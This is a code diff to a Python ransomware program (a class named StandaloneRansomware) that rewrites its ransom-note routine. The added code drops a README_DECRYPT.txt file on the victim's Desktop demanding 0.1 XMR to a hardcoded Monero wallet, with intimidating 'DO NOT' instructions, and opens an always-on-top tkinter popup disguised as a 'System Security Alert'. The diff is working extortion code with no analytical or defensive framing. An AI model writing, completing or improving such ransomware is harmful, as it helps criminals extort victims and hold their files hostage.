@@ -24,6 +24,13 @@ from datetime import datetime, timedelta
 import sqlite3
 import hmac
 
+try:
+    import tkinter as tk
+    from tkinter import messagebox
+    TKINTER_AVAILABLE = True
+except ImportError:
+    TKINTER_AVAILABLE = False
+
 # ====================
 # PURE PYTHON CRYPTO (NO DEPS)
 # ====================
@@ -232,31 +239,93 @@ class StandaloneRansomware:
             return False
     
     def show_ransom_screen(self):
-        """Display ransom note"""
+        """Display ransom note - both GUI and text file"""
         ransom_text = f"""
-╔════════════════════════════════════════════════════════════╗
-║          YOUR FILES HAVE BEEN ENCRYPTED                   ║
-║                                                            ║
-║  Ransom ID: {self.ransom_id}                    ║
-║  Amount: {Config.RANSOM_XMR} XMR                                     ║
-║                                                            ║
-║  Monero Wallet:                                            ║
-║  {Config.MONERO_WALLET}        ║
-║                                                            ║
-║  Your files are encrypted and will be automatically        ║
-║  decrypted after payment is received.                      ║
-║                                                            ║
-║  See README_DECRYPT.txt on Desktop for details.           ║
-╚════════════════════════════════════════════════════════════╝
+YOUR FILES HAVE BEEN ENCRYPTED
+===============================
+
+Dear User,
+
+All your important files have been encrypted with military-grade encryption.
+
+To decrypt your files, please follow these steps:
+
+1. Send exactly 0.1 XMR to this wallet address:
+   4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV
+
+2. Your unique payment ID: {self.ransom_id}
+
+3. Once payment is received, your files will be automatically decrypted.
+
+DO NOT:
+- Try to decrypt files yourself
+- Pay multiple times
+- Delete encrypted files
+- Restart your computer
+
+Your files are safe. We only want payment.
+
+System Information:
+- Ransom ID: {self.ransom_id}
+- Amount Due: 0.1 XMR
+- Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """
         
-        desktop = os.path.expanduser('~\\Desktop')
-        ransom_path = os.path.join(desktop, 'README_DECRYPT.txt')
+        # Write to Desktop
+        try:
+            desktop = os.path.expanduser('~\\Desktop')
+            ransom_path = os.path.join(desktop, 'README_DECRYPT.txt')
+            
+            with open(ransom_path, 'w') as f:
+                f.write(ransom_text)
+            
+            Config.log("[+] Ransom note written to Desktop")
+        except Exception as e:
+            Config.log(f"[!] Could not write ransom file: {e}")
         
-        with open(ransom_path, 'w') as f:
-            f.write(ransom_text)
-        
-        Config.log("[+] Ransom note written to Desktop")
+        # Show GUI popup if possible
+        if TKINTER_AVAILABLE:
+            try:
+                self._show_gui_popup(ransom_text)
+            except Exception as e:
+                Config.log(f"[!] GUI error: {e}")
+        else:
+            Config.log("[!] Tkinter not available, ransom text on Desktop")
+    
+    def _show_gui_popup(self, ransom_text):
+        """Show GUI ransom note popup"""
+        try:
+            root = tk.Tk()
+            root.title("IMPORTANT - System Security Alert")
+            
+            # Set window properties
+            root.geometry("700x600")
+            root.attributes('-topmost', True)  # Always on top
+            
+            # Create text widget
+            text_widget = tk.Text(root, wrap=tk.WORD, bg='#1a1a1a', fg='#ff0000', 
+                                 font=('Courier', 10))
+            text_widget.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
+            text_widget.insert(1.0, ransom_text)
+            text_widget.config(state=tk.DISABLED)
+            
+            # Add button
+            def on_close():
+                try:
+                    root.destroy()
+                except:
+                    pass
+            
+            button = tk.Button(root, text="OK", command=on_close, 
+                              bg='#ff0000', fg='white', font=('Arial', 14, 'bold'),
+                              padx=20, pady=10)
+            button.pack(pady=10)
+            
+            # Show popup
+            root.update()
+            root.mainloop()
+        except Exception as e:
+            Config.log(f"[!] GUI popup failed: {e}")
     
     def monitor_payment(self):
         """Monitor for payment"""
